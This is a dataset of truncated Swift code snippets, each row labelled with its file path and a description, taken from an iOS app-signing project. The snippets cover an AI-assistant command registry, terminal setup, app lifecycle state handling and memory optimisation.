1846,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","/ Processes voice commands (simulated)","private func processVoiceCommand(_ audioQuery: String) -> String {
// In a real implementation, this would connect to speech recognition
// For now, we'll just simulate it by parsing the text directly

// Remove ""process voice"" prefix if present
var processedCommand = audioQuery
if processedCommand.hasPrefix(""process voice"") {"
1847,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","MARK: - Supporting Types / Structure for encoding/decoding command history","struct CommandHistoryEntry: Codable {
let command: String
let parameter: String
let timestamp: Date
}
"
1848,swift,iOS,protocol,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift","/ Protocol for view controllers to explicitly identify their screen name.","protocol ScreenIdentifiable {
var screenName: String { get }"
1849,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift","/ Manages the app's context and command execution for the AI assistant.","final class AppContextManager {
// Singleton instance
static let shared = AppContextManager()

// Properties
var currentState: AppContext? // Refers to AppContext from AppContext.swift
private var commandHandlers: [String: (String, @escaping (String) -> Void) -> Void] = [:]
private let commandQueue = DispatchQueue(label: ""com.app.commandQueue"")

// Command history for AI prediction"
1850,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift","/ Updates the app's context based on the current view controller.","func updateContext(_ viewController: UIViewController) {
var additionalData: [String: Any] = [:]

// Fetch data from CoreDataManager for app state
let sources = CoreDataManager.shared.getAZSources()
let downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()
let signedApps = CoreDataManager.shared.getDatedSignedApps()
let certificates = CoreDataManager.shared.getDatedCertificate()
let currentCertificate = CoreDataManager.shared.getCurrentCertificate()
"
1851,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift","/ Returns the current app context.","func currentContext() -> AppContext {
return currentState ?? AppContext(currentScreen: ""Unknown"", additionalData: [:])
}

/// Registers a command with its handler, including a completion callback.
func registerCommand(_ command: String, handler: @escaping (String, @escaping (String) -> Void) -> Void) {"
1852,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift","/ Registers a command with its handler, including a completion callback.","func registerCommand(_ command: String, handler: @escaping (String, @escaping (String) -> Void) -> Void) {
commandQueue.sync {"
1853,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift","/ Executes a command with the given parameter and returns the result via completion.","func executeCommand(_ command: String, parameter: String, completion: @escaping (AppCommandResult) -> Void) {
commandQueue.sync {"
1854,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift","/ Returns a list of available commands.","func availableCommands() -> [String] {
commandQueue.sync {"
1855,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift","/ Sets additional context data dynamically.","func setAdditionalContextData(_ data: [String: Any]) {
// Since AppContext is immutable, create a new instance
if let current = currentState {"
1856,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift","/ Result type for command execution.","enum AppCommandResult {
case successWithResult(String)
case unknownCommand(String)
}

/// Struct to format app information.
struct AppInfo {"
1857,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift","/ Struct to format app information.","struct AppInfo {
let name: String
let version: String
var description: String { ""\(name) (\(version))"" }"
1858,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager.swift","/ Struct to format signed app information.","struct SignedAppInfo {
let name: String
let bundleIdentifier: String
let teamName: String
var description: String { ""\(name) (\(bundleIdentifier)) - Team: \(teamName)"" }"
1859,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppDelegate+Terminal.swift","extension AppDelegate - implements functionality related to app delegate","extension AppDelegate {
/// Initialize terminal components
func setupTerminal() {"
1860,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppDelegate+Terminal.swift","/ Initialize terminal components","func setupTerminal() {
// Register terminal tab option (default to true for new installs)
if UserDefaults.standard.object(forKey: ""show_terminal_button"") == nil {"
1861,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppDelegate+Terminal.swift","/ Register terminal-related commands for AI assistant","private func registerTerminalCommands() {
// Command: open terminal
AppContextManager.shared.registerCommand(""open terminal"") { _, completion in"
1862,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppDelegate+Terminal.swift","/ Initialize terminal components after app launch","func initializeTerminalAfterLaunch() {
// Delay to allow UI to stabilize
DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {"
1863,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppDelegate+Terminal.swift","Call this from applicationDidBecomeActive","func restoreTerminalButtonIfNeeded() {
if UserDefaults.standard.bool(forKey: ""show_terminal_button"") {"
1864,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ A comprehensive manager for app lifecycle and state preservation / / This class improves app state management during lifecycle events: / 1. Robust state preservation across app backgrounding/foregrounding / 2. Enhanced background task management / 3. Crash recovery and session restoration / 4. Coordinated view state preservation","final class AppLifecycleManager {
// MARK: - Singleton

/// Shared instance
static let shared = AppLifecycleManager()

// MARK: - Properties

/// Current app state
private(set) var appState: AppState = .inactive {"
1865,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","MARK: - Setup / Sets up observation of app lifecycle events","private func setupObservers() {
NotificationCenter.default.addObserver(
self,
selector: #selector(applicationWillResignActive),
name: UIApplication.willResignActiveNotification,
object: nil
)

NotificationCenter.default.addObserver(
self,"
1866,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","MARK: - App Lifecycle Handlers","@objc private func applicationWillResignActive() {
appState = .inactive
Debug.shared.log(message: ""App will resign active"", type: .info)

// Save state immediately when app becomes inactive
saveApplicationState()

// Notify components to prepare for inactivity
NotificationCenter.default.post(name: .appWillBecomeInactive, object: nil)
}"
1867,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","Function applicationDidEnterBackground - implements applicationdidenterbackground functionality","@objc private func applicationDidEnterBackground() {
appState = .background
Debug.shared.log(message: ""App did enter background"", type: .info)

// Additional state saving for background mode
saveApplicationState()

// Start background tasks that need to continue
startBackgroundTasks()
"
1868,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","Function applicationWillEnterForeground - implements applicationwillenterforeground functionality","@objc private func applicationWillEnterForeground() {
appState = .foreground
Debug.shared.log(message: ""App will enter foreground"", type: .info)

// Prepare to restore state
prepareForForeground()

// Notify components about foreground state
NotificationCenter.default.post(name: .appWillEnterForeground, object: nil)
}"
1869,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","Function applicationDidBecomeActive - implements applicationdidbecomeactive functionality","@objc private func applicationDidBecomeActive() {
appState = .active
Debug.shared.log(message: ""App did become active"", type: .info)

// Complete state restoration
completeStateRestoration()

// Verify Core Data state is clean
verifyDataIntegrity()
"
1870,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","Function applicationWillTerminate - implements applicationwillterminate functionality","@objc private func applicationWillTerminate() {
Debug.shared.log(message: ""App will terminate"", type: .info)

// Final save before termination
saveApplicationState(isTerminating: true)

// Cancel any background tasks
cancelAllBackgroundTasks()

// Notify components about termination"
1871,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","Function didReceiveMemoryWarning - implements didreceivememorywarning functionality","@objc private func didReceiveMemoryWarning() {
Debug.shared.log(message: ""Memory warning received"", type: .warning)

// Save critical state
saveApplicationState()

// Cancel non-essential background tasks
cancelNonEssentialBackgroundTasks()

// Notify components to reduce memory usage"
1872,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","Function tabDidChange - implements tabdidchange functionality","@objc private func tabDidChange(_ notification: Notification) {
if let tab = notification.userInfo?[""tab""] as? String {"
1873,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","MARK: - State Change Handling / Called when the app state changes","private func stateDidChange(from oldState: AppState, to newState: AppState) {
Debug.shared.log(message: ""App state changed from \(oldState) to \(newState)"", type: .debug)

switch (oldState, newState) {"
1874,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","MARK: - State Persistence / Saves the current application state","func saveApplicationState(isTerminating: Bool = false) {
Debug.shared.log(message: ""Saving application state (terminating: \(isTerminating))"", type: .debug)

// Capture timestamp of save
let timestamp = Date()
lastSaveTimestamp = timestamp

// Create state container
var state: [String: Any] = [
""timestamp"": timestamp,"
1875,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Loads the persisted application state","private func loadPersistedState() {
Debug.shared.log(message: ""Loading persisted application state"", type: .debug)

// Check for crash recovery
checkForCrashRecovery()

// Load saved state
if let stateData = UserDefaults.standard.data(forKey: ""AppStateData""),
let state = try? JSONSerialization.jsonObject(with: stateData, options: []) as? [String: Any]
{"
1876,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Saves the Core Data context","private func saveDataContext(isTerminating _: Bool) {
do {"
1877,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","MARK: - State Restoration / Prepares for app returning to foreground","private func prepareForForeground() {
Debug.shared.log(message: ""Preparing for foreground"", type: .debug)

// Load any updated state
loadPersistedState()

// Prepare UI for restoration
prepareUIForRestoration()

// Notify components to prepare for foreground"
1878,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Completes state restoration after app becomes active","private func completeStateRestoration() {
Debug.shared.log(message: ""Completing state restoration"", type: .debug)

// Complete restoration of active tab
if let selectedTab = UserDefaults.standard.string(forKey: ""selectedTab"") {"
1879,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Prepares UI for restoration","private func prepareUIForRestoration() {
DispatchQueue.main.async {"
1880,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Completes UI restoration","private func completeUIRestoration() {
DispatchQueue.main.async {"
1881,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","MARK: - View State Management / Saves the state of the current tab","private func saveTabState() {
if let selectedTab = UserDefaults.standard.string(forKey: ""selectedTab"") {"
1882,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Restores the state for a specific tab","private func restoreTabState(for tab: String) {
// Check if we have saved state for this tab
if let tabState = viewStates[""\(tab)_viewState""] {"
1883,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Helper method to refresh the entire view hierarchy","private func refreshViewHierarchy(_ viewController: UIViewController) {
// Make the view controller interactive
viewController.view.isUserInteractionEnabled = true

// Force layout update
viewController.view.setNeedsLayout()
viewController.view.layoutIfNeeded()

// Check if the view controller conforms to our refreshable protocol
// and call the refresh method directly if it does"
1884,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Applies theme to view controller hierarchy","private func applyAppTheme(to viewController: UIViewController) {
// Apply tint color
viewController.view.tintColor = Preferences.appTintColor.uiColor

// Apply interface style
viewController
.overrideUserInterfaceStyle = UIUserInterfaceStyle(rawValue: Preferences.preferredInterfaceStyle) ??
.unspecified

// Apply to child view controllers"
1885,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","MARK: - Background Tasks / Prepares background tasks when app is about to enter background","private func prepareBackgroundTasks() {
Debug.shared.log(message: ""Preparing background tasks"", type: .debug)

// Make sure Core Data is saved
saveDataContext(isTerminating: false)
}

/// Starts background tasks that need to continue in background
private func startBackgroundTasks() {"
1886,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Starts background tasks that need to continue in background","private func startBackgroundTasks() {
// Start monitoring task for app state
startStateMonitoringTask()

// Start tasks for any in-progress operations
startTasksForActiveOperations()
}

/// Starts a background task for monitoring app state
private func startStateMonitoringTask() {"
1887,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Starts a background task for monitoring app state","private func startStateMonitoringTask() {
var taskId: UIBackgroundTaskIdentifier = .invalid

// Use captured local variable for task ID to avoid capture-reference cycle
taskId = UIApplication.shared.beginBackgroundTask(withName: ""StateMonitoring"") { [weak self, taskId] in"
1888,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Starts background tasks for active operations","private func startTasksForActiveOperations() {
let activeOps = getActiveOperations()

for operation in activeOps {"
1889,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Cancels background tasks that can be deferred","private func cancelDeferrableBackgroundTasks() {
for (taskId, taskInfo) in backgroundTasks {"
1890,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Cancels non-essential background tasks (during memory pressure)","private func cancelNonEssentialBackgroundTasks() {
for (taskId, taskInfo) in backgroundTasks {"
1891,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Cancels all background tasks","private func cancelAllBackgroundTasks() {
for (taskId, taskInfo) in backgroundTasks {"
1892,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","MARK: - Operations Management / Gets information about active operations","private func getActiveOperations() -> [[String: Any]] {
// This would be populated with real data from various managers
// For now, we'll return an empty array
return []
}

/// Saves state for a specific operation
private func saveOperationState(for operationName: String) {"
1893,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Saves state for a specific operation","private func saveOperationState(for operationName: String) {
// Implementation would save specific operation state
Debug.shared.log(message: ""Saving state for operation: \(operationName)"", type: .debug)
}

/// Resumes operations that were active when app went to background
private func resumeOperations(_ operations: [[String: Any]]) {"
1894,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Resumes operations that were active when app went to background","private func resumeOperations(_ operations: [[String: Any]]) {
for operation in operations {"
1895,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","MARK: - Crash Recovery / Checks for signs of a previous crash and attempts recovery","private func checkForCrashRecovery() {
let lastSessionEndedCleanly = UserDefaults.standard.bool(forKey: ""SessionEndedCleanly"")
UserDefaults.standard.set(false, forKey: ""SessionEndedCleanly"")

if !lastSessionEndedCleanly {"
1896,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Attempts to recover from a crash","private func attemptCrashRecovery() {
// Check Core Data integrity
do {"
1897,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Verifies data integrity when app becomes active","private func verifyDataIntegrity() {
processingQueue.async {"
1898,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Prepares for transitioning to inactive state","private func prepareForInactive() {
// Mark that the session is ending cleanly
UserDefaults.standard.set(true, forKey: ""SessionEndedCleanly"")
UserDefaults.standard.synchronize()
}
}

// MARK: - Supporting Types

/// App lifecycle states"
1899,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","MARK: - Supporting Types / App lifecycle states","enum AppState: String {
case inactive = ""Inactive""
case background = ""Background""
case foreground = ""Foreground""
case active = ""Active""
}

/// Information about a background task
struct BackgroundTaskInfo {"
1900,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Information about a background task","struct BackgroundTaskInfo {
let id: UIBackgroundTaskIdentifier
let name: String
let startTime: Date
let isPriority: Bool
}

/// Protocol for view controllers that can save and restore state
protocol StateSavable {"
1901,swift,iOS,protocol,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Protocol for view controllers that can save and restore state","protocol StateSavable {
func saveState() -> Any
func restoreState(_ state: Any)
}

// MARK: - Notification Extensions

extension Notification.Name {"
1902,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","Function saveState - implements savestate functionality","func saveState() -> Any
func restoreState(_ state: Any)
}

// MARK: - Notification Extensions

extension Notification.Name {"
1903,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","Function restoreState - implements restorestate functionality","func restoreState(_ state: Any)
}

// MARK: - Notification Extensions

extension Notification.Name {"
1904,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","MARK: - Notification Extensions","extension Notification.Name {
static let appWillBecomeInactive = Notification.Name(""appWillBecomeInactive"")
static let appDidEnterBackground = Notification.Name(""appDidEnterBackground"")
static let appWillEnterForeground = Notification.Name(""appWillEnterForeground"")
static let appDidBecomeActive = Notification.Name(""appDidBecomeActive"")
static let appWillTerminate = Notification.Name(""appWillTerminate"")
static let appDidReceiveMemoryWarning = Notification.Name(""appDidReceiveMemoryWarning"")
static let appStateDidSave = Notification.Name(""appStateDidSave"")
static let appStateRestorationCompleted = Notification.Name(""appStateRestorationCompleted"")
static let appPreparingForForeground = Notification.Name(""appPreparingForForeground"")"
1905,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","MARK: - Core Data Manager Extensions","extension CoreDataManager {
/// Verifies Core Data store consistency
func verifyStoreConsistency() throws {"
1906,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Verifies Core Data store consistency","func verifyStoreConsistency() throws {
// Implementation would check Core Data store integrity
// This is a placeholder for the actual implementation
}

/// Attempts to recover a damaged Core Data store
func attemptStoreRecovery() {"
1907,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift","/ Attempts to recover a damaged Core Data store","func attemptStoreRecovery() {
// Implementation would attempt to recover from Core Data issues
// This is a placeholder for the actual implementation
}
}
"
1908,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ A centralized manager for app-wide performance optimization","final class AppPerformanceOptimizer {
// MARK: - Singleton

/// Shared instance
static let shared = AppPerformanceOptimizer()

// MARK: - Properties

/// Background task identifiers
private var backgroundTasks = [String: UIBackgroundTaskIdentifier]()"
1909,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","MARK: - App Lifecycle / Register for app lifecycle events","private func registerForAppLifecycleEvents() {
// Foreground notifications
NotificationCenter.default.addObserver(
self,
selector: #selector(handleAppWillEnterForeground),
name: UIApplication.willEnterForegroundNotification,
object: nil
)

// Background notifications"
1910,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","Function handleAppWillEnterForeground - implements handleappwillenterforeground functionality","@objc private func handleAppWillEnterForeground() {
Debug.shared.log(message: ""App will enter foreground, optimizing performance"", type: .info)

// Clear any unnecessary caches
performLightMemoryCleanup()

// Reset metrics
metrics.resetMetrics()

// Restart memory check timer"
1911,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","Function handleAppDidEnterBackground - implements handleappdidenterbackground functionality","@objc private func handleAppDidEnterBackground() {
Debug.shared.log(message: ""App did enter background, performing cleanup"", type: .info)

// Stop memory check timer
memoryCheckTimer?.invalidate()
memoryCheckTimer = nil

// Perform cleanup
performDeepMemoryCleanup()
"
1912,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","Function handleAppWillTerminate - implements handleappwillterminate functionality","@objc private func handleAppWillTerminate() {
Debug.shared.log(message: ""App will terminate, performing final cleanup"", type: .info)

// Save all Core Data
saveAllManagedObjectContexts()

// End all background tasks
endAllBackgroundTasks()

// Cancel all network operations"
1913,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","MARK: - Memory Management / Start the memory check timer","private func startMemoryCheckTimer() {
// Stop existing timer if any
memoryCheckTimer?.invalidate()

// Create new timer
memoryCheckTimer = Timer.scheduledTimer(
timeInterval: 30.0, // Check every 30 seconds
target: self,
selector: #selector(checkMemoryUsage),
userInfo: nil,"
1914,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","Function checkMemoryUsage - implements checkmemoryusage functionality","@objc private func checkMemoryUsage() {
let memoryUsage = getCurrentMemoryUsage()
metrics.updateMemoryUsage(memoryUsage)

Debug.shared.log(message: ""Memory usage: \(Int(memoryUsage * 100))%"", type: .debug)

// If memory usage is above threshold, perform cleanup
if memoryUsage > memoryThreshold {"
1915,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ Handle memory warning from the system","@objc private func handleMemoryWarning() {
Debug.shared.log(message: ""Memory warning received, performing deep cleanup"", type: .warning)

// Record the warning
metrics.recordMemoryWarning()

// Perform deep memory cleanup
performDeepMemoryCleanup()
}
"
1916,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ Get current memory usage as a percentage (0.0 to 1.0)","private func getCurrentMemoryUsage() -> Float {
var info = mach_task_basic_info()
var count = mach_msg_type_number_t(MemoryLayout<mach_task_basic_info>.size) / 4

let kerr: kern_return_t = withUnsafeMutablePointer(to: &info) {"
1917,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ Perform a light memory cleanup (non-disruptive)","private func performLightMemoryCleanup() {
// Clear image memory cache
ImageCache.shared.clearCache()

// Clean NSURLCache
URLCache.shared.removeAllCachedResponses()

// Reset NSURLSession cache
let configuration = URLSessionConfiguration.default
configuration.urlCache = nil"
1918,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ Perform a deep memory cleanup (more aggressive)","private func performDeepMemoryCleanup() {
// Perform light cleanup first
performLightMemoryCleanup()

// Clear network response cache
NetworkManager.shared.clearCache()

// Reset all tableview optimizers' caches
purgeTableViewOptimizerCaches()
"
1919,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ Reset unneeded Core Data caches","private func resetUnneededCoreDataCaches() {
do {"
1920,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ Save all managed object contexts","private func saveAllManagedObjectContexts() {
do {"
1921,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ Purge all TableViewOptimizer caches","private func purgeTableViewOptimizerCaches() {
NotificationCenter.default.post(
name: Notification.Name(""PurgeTableViewOptimizerCaches""),
object: nil,
userInfo: nil
)
}

// MARK: - Background Task Management
"
1922,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","MARK: - Background Task Management / Begin a background task / - Parameters: /   - identifier: A unique identifier for the task /   - expirationHandler: Block to execute if the task is about to expire","func beginBackgroundTask(identifier: String, expirationHandler: (() -> Void)? = nil) {
taskMutex.lock()
defer { taskMutex.unlock() }"
1923,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ End a background task / - Parameter identifier: The identifier of the task to end","func endBackgroundTask(identifier: String) {
taskMutex.lock()
defer { taskMutex.unlock() }"
1924,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ End all background tasks","private func endAllBackgroundTasks() {
taskMutex.lock()
defer { taskMutex.unlock() }"
1925,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","MARK: - Public Methods / Perform a task in the background / - Parameters: /   - identifier: A unique identifier for the task /   - task: The task to perform /   - completion: Completion handler called on the main thread","func performBackgroundTask(identifier: String, task: @escaping () -> Void, completion: (() -> Void)? = nil) {
// Start background task to keep app running
beginBackgroundTask(identifier: identifier)

// Add operation to background queue
backgroundQueue.addOperation { [weak self] in"
1926,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ Optimize a view controller for better performance / - Parameter viewController: The view controller to optimize","func optimizeViewController(_ viewController: UIViewController) {
// Enable scrollsToTop only for visible scroll views
disableScrollsToTopForHiddenViews(in: viewController.view)

// Configure Core Data fetching for better performance
configureCoreDataFetching(for: viewController)

// Optimize image loading
deferImageLoading(in: viewController.view)
}"
1927,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","MARK: - View Optimization Methods / Disable scrollsToTop for hidden scroll views / - Parameter view: The parent view","private func disableScrollsToTopForHiddenViews(in view: UIView) {
var visibleScrollViewFound = false

for subview in view.subviews {"
1928,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ Configure Core Data fetching for better performance / - Parameter viewController: The view controller","private func configureCoreDataFetching(for viewController: UIViewController) {
// Check if the view controller uses Core Data
if viewController is UITableViewController {"
1929,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ Defer image loading for off-screen views / - Parameter view: The parent view","private func deferImageLoading(in view: UIView) {
for subview in view.subviews {"
1930,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","MARK: - Performance Metrics / Tracks performance metrics for the app","class PerformanceMetrics {
// MARK: - Properties

/// Peak memory usage (0.0 to 1.0)
private(set) var peakMemoryUsage: Float = 0.0

/// Number of memory warnings received
private(set) var memoryWarningCount: Int = 0

/// When the metrics were last reset"
1931,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","MARK: - Methods / Reset all metrics","func resetMetrics() {
peakMemoryUsage = 0.0
memoryWarningCount = 0
lastResetTime = Date()
memoryUsageHistory.removeAll()
}

/// Update the memory usage
/// - Parameter usage: Current memory usage (0.0 to 1.0)
func updateMemoryUsage(_ usage: Float) {"
1932,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ Update the memory usage / - Parameter usage: Current memory usage (0.0 to 1.0)","func updateMemoryUsage(_ usage: Float) {
// Update peak memory usage
peakMemoryUsage = max(peakMemoryUsage, usage)

// Add to history
memoryUsageHistory.append(usage)

// Keep only the last 10 readings
if memoryUsageHistory.count > 10 {"
1933,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ Record a memory warning","func recordMemoryWarning() {
memoryWarningCount += 1
}

/// Get the average memory usage
/// - Returns: Average memory usage (0.0 to 1.0)
func averageMemoryUsage() -> Float {"
1934,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ Get the average memory usage / - Returns: Average memory usage (0.0 to 1.0)","func averageMemoryUsage() -> Float {
guard !memoryUsageHistory.isEmpty else { return 0.0 }"
1935,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","MARK: - UIView Extension","extension UIView {
/// Check if the view is visible on screen
/// - Returns: True if the view is visible
func isVisible() -> Bool {"
1936,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift","/ Check if the view is visible on screen / - Returns: True if the view is visible","func isVisible() -> Bool {
guard !isHidden && alpha > 0 else { return false }"
1937,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/CustomCommandProcessor.swift","/ Processes commands extracted from AI responses","class CustomCommandProcessor {
// Singleton instance
